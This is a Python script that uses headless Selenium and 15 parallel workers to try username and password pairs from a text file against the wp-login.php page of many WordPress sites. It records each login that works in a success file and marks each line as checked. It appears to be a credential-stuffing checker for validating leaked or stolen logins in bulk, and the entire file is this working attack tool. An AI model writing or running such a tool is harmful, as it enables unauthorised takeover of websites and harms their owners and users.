from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from concurrent.futures import ThreadPoolExecutor
import time
import re


def format_url(url):
    """Ensure the URL has a valid format with http:// or https://."""
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url  # Default to http if no protocol is specified
    return url


def is_valid_url(url):
    """Validate the URL using a regex."""
    regex = re.compile(
        r'^(http://|https://)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(/.*)?$'
    )
    return re.match(regex, url) is not None


def check_wordpress_with_selenium(url, username, password, driver_path):
    """Use Selenium to check WordPress login."""
    # Format and validate the URL
    url = format_url(url)
    if not is_valid_url(url):
        return f"Invalid URL: {url}"

    # Setup WebDriver
    service = Service(driver_path)
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")  # Run in headless mode
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-dev-shm-usage")
    driver = webdriver.Chrome(service=service, options=options)

    try:
        # Navigate to the login page
        login_url = f"{url.rstrip('/')}/wp-login.php"
        driver.get(login_url)

        # Step 2: Enter username and password
        try:
            username_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "user_login"))
            )
            password_input = driver.find_element(By.ID, "user_pass")
            submit_button = driver.find_element(By.ID, "wp-submit")

            username_input.send_keys(username)
            password_input.send_keys(password)
            submit_button.click()
        except TimeoutException:
            return f"Login form elements not found for {url}"

        # Step 3: Check for login success or errors
        WebDriverWait(driver, 10).until(
            lambda d: d.current_url != login_url  # Wait until redirected
        )

        # Step 4: Validate successful login
        current_url = driver.current_url
        if "wp-admin" in current_url:
            return f"Login successful: {url}"

        # Step 5: Check for error message
        try:
            error_element = driver.find_element(By.ID, "login_error")
            return f"Login failed for {url}: {error_element.text}"
        except NoSuchElementException:
            return f"No explicit error found for {url}. Login might have failed."

    except Exception as e:
        return f"An error occurred for {url}: {e}"
    finally:
        driver.quit()


def update_input_file(file_path, checked_site):
    """Marks the site as checked in the input file."""
    with open(file_path, 'r') as file:
        lines = file.readlines()

    with open(file_path, 'w') as file:
        for line in lines:
            if line.strip().startswith(checked_site) and ",checked" not in line:
                file.write(line.strip() + ",checked\n")
            else:
                file.write(line)


def process_single_site(site, username, password, driver_path, success_file, failure_file, input_file):
    """Helper function to process a single site."""
    url = f"{site}"
    print(f"Processing site: {url} with username: {username}")
    result = check_wordpress_with_selenium(url, username, password, driver_path)
    print(f"Result for {url}: {result}\n")

    # Save results to the appropriate file
    if "Login successful" in result:
        with open(success_file, 'a') as success_log:
            success_log.write(f"{url},{username},{password}\n")
    else:
        with open(failure_file, 'a') as failure_log:
            failure_log.write(f"{url},{username},{password}\n")

    # Mark as checked
    update_input_file(input_file, site)


def process_sites_from_file(file_path, driver_path, success_file, failure_file, max_workers=15):
    """Process multiple sites concurrently."""
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
            tasks = []

            # Parse each line
            for line in lines:
                if not line.strip() or ",checked" in line:
                    continue  # Skip already checked or empty lines
                try:
                    site, username, password = line.strip().split(',')
                    site = site.strip()
                    username = username.strip().strip('"')  # Remove extra quotes
                    password = password.strip().strip('"')  # Remove extra quotes
                    tasks.append((site, username, password))
                except ValueError:
                    print(f"Skipping invalid line: {line.strip()}")

            # Process sites concurrently
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                for site, username, password in tasks:
                    executor.submit(
                        process_single_site,
                        site,
                        username,
                        password,
                        driver_path,
                        success_file,
                        failure_file,
                        file_path,  # Pass the input file to mark as checked
                    )
    except FileNotFoundError:
        print(f"File not found: {file_path}")


# Example usage
file_path = "wordpress-login-notfiltered-cleanfile.txt"  # Path to your text file
driver_path = "chromedriver.exe"  # Path to your ChromeDriver
success_file = "success-wordpress-logins-one.txt"
failure_file = "failed-wordpress-logins-one.txt"

start_time = time.time()
process_sites_from_file(file_path, driver_path, success_file, failure_file, max_workers=15)
end_time = time.time()

print(f"Finished processing sites in {end_time - start_time:.2f} seconds.")
